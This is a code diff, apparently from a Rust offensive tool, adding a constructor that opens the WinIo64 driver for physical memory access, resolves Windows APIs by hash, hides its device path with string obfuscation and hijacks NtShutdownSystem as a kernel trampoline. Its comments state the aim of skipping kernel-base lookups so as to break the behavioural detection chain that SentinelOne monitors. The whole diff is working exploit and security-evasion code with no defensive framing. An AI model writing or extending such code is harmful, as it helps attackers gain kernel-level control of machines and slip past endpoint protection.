@@ -180,6 +180,70 @@ impl DmEngine {
         Ok(engine)
     }
 
+    /// Create engine with precomputed kernel base and trampoline address.
+    ///
+    /// Skips NtQuerySystemInformation and physical memory scanning entirely,
+    /// breaking the behavioral detection chain that Sentinel ONE monitors.
+    pub fn new_precomputed(
+        api: &ApiResolver,
+        ntos_virt_base: u64,
+        trampoline_phys: u64,
+    ) -> Result<Self, String> {
+        // 1. Resolve Win32 APIs (same as new)
+        let fn_ioctl: FnDeviceIoControl = unsafe {
+            std::mem::transmute(
+                api.k32(HASH_DEVICE_IO_CONTROL)
+                    .ok_or("resolve DeviceIoControl")?,
+            )
+        };
+        let fn_close: FnCloseHandle = unsafe {
+            std::mem::transmute(api.k32(HASH_CLOSE_HANDLE).ok_or("resolve CloseHandle")?)
+        };
+
+        // 2. Resolve user-mode trampoline
+        let trampoline_user: FnTrampoline = unsafe {
+            std::mem::transmute(
+                api.ntdll(HASH_NT_SHUTDOWN_SYSTEM)
+                    .ok_or("resolve NtShutdownSystem")?,
+            )
+        };
+
+        // 3. Open WinIo64 device
+        let fn_create: FnCreateFileW = unsafe {
+            std::mem::transmute(api.k32(HASH_CREATE_FILE_W).ok_or("resolve CreateFileW")?)
+        };
+        let path = crate::obfstr_helper::dev_winio();
+        let device = unsafe {
+            fn_create(
+                path.as_ptr(),
+                0xC0000000,
+                0,
+                std::ptr::null(),
+                3,
+                0x80,
+                HANDLE::default(),
+            )
+        };
+        if device.is_invalid() {
+            return Err(format!("open WinIo: error {}", unsafe { GetLastError().0 }));
+        }
+
+        // 4. Use precomputed values — NO kernel base query, NO physical memory scan
+        Ok(DmEngine {
+            device,
+            fn_ioctl,
+            fn_close,
+            trampoline_user,
+            trampoline_phys,
+            ntos_virt_base,
+        })
+    }
+
+    /// Return precomputed values for passing to another process invocation.
+    pub fn get_precomputed_values(&self) -> (u64, u64) {
+        (self.ntos_virt_base, self.trampoline_phys)
+    }
+
     // ═══════════════════════════════════════════════════════════════════════
     // Physical memory primitives (WinIo64 Section mapping)
     // ═══════════════════════════════════════════════════════════════════════
